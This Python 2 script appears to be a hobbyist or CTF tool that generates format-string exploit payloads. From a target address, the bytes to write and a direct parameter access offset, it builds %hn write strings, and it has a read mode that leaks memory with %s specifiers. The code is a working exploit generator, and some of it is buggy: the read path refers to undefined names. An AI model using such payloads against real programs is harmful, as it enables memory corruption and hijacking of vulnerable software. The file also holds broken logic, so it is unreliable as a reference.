#!/usr/bin/python
import sys
import argparse
import getopt
import struct

def generateReadFormatString(string, write, address):
	for x in range(int(write)):
		string+=''.join("\\x%02x" %ord(i) for i in struct.pack("<L",
		int(address, 16)+x))
	if printfConfig:
		string+="\"`"
	for x in range(int(write)):
		string+="%" + str(int(DPA) + x - 1) + "\\$08s."
	print string
	exit()

def generateFormatString(address, write, DPA, printfConfig, read):
	if printfConfig=="yes" or printfConfig=="y":
		string="`printf \""
	else: #elif printfConfig=="no" or printfConfig=="n":
		string=""
	if read:
		generateReadFormatString(string, write, address)
	'''Build the destination addresses'''
	for x in range((len(write)/4)):
		string+=''.join("\\x%02x" %ord(i) for i in struct.pack("<L",int(address,16)+2*x))
	if printfConfig=="yes" or printfConfig=="y":
		string+="\"`"
	'''Finished building the destination addresses...'''

	'''Calculate the offset numbers'''
	number=int((len(write)/4) * 4)
	content=write[::-1]
	offsets=[]
	bytes2=[]
	for x in range(len(content)/4):
		#of the to write, grab each consequtive group of 4 hex digits
		a=int(content[4*x:4*(x+1)][::-1] ,16)
		#append this group to the bytes2 list
		bytes2.append(a)
		#if this is the first pass, do a special check
		if len(bytes2)==1:
			if (a-number)<8:
				offsets.append(a+0x10000-number)
			else:
				offsets.append(a-number)
		else:
			if (a-bytes2[len(bytes2)-4])<8:
				offsets.append(a+0x10000-bytes2[len(bytes2)-2])
			else:
				offsets.append(a-bytes2[len(bytes2)-2])

	'''Build the actual format specifiers using DPA and offset methods'''
	for x in range(len(offsets)):
		string+="%"+str(offsets.pop(0))+"x%"+str(int(DPA)+x)+"\\$hn"

	'''mission accomplished!'''
	print string

def printUsage():
	print """Usage: -p yes - adds additional wrapper around string to use 
	bash printf"""

	print """Usage: -r yes - only generates a string useful for reading
	read from address after -a by -w distance"""

	print """Usage: -a (0x)-------- -w (0x)... -DPA <value> 
	This format allows one to write at -a bytes of -w using a Direct Parameter
	Access of value <value>"""

def requireArgument(argument):
	print "Must have an argument: " + argument

def requireAddress(args):
	if args.address==None:
		requireArgument("-a/--address <address to write to>\n");
		printUsage()
		exit(-1)

def requireWriteValue(args):
	if args.write==None:
		requireArgument("-w/--write <write bytes>\n");
		printUsage()
		exit(-1)

def requireDPA(args):
	if args.DPA==None:
		requireArgument("-d/--DPA <Direct Parameter Access value>")
		printUsage()


if __name__=="__main__":
	address=""
	toWrite=""
	DPA=""
	printConfig=0
	parser=argparse.ArgumentParser()
	parser.add_argument('-p', '--printfConfig')
	parser.add_argument('-a', '--address')
	parser.add_argument('-w', '--write')
	parser.add_argument('-d', '--DPA')
	parser.add_argument('-r', '--read')
	args=parser.parse_args()
	if args.read=="yes":
		requireAddress(args)
		requireWriteValue(args)
		generateFormatString(args.address, args.write, args.DPA, args.printfConfig, True)
	elif args.address==None:
		printUsage()
	else:
		requireAddress(args)
		requireWriteValue(args)
		requireDPA(args)
		generateFormatString(args.address, args.write, args.DPA, args.printfConfig, False)
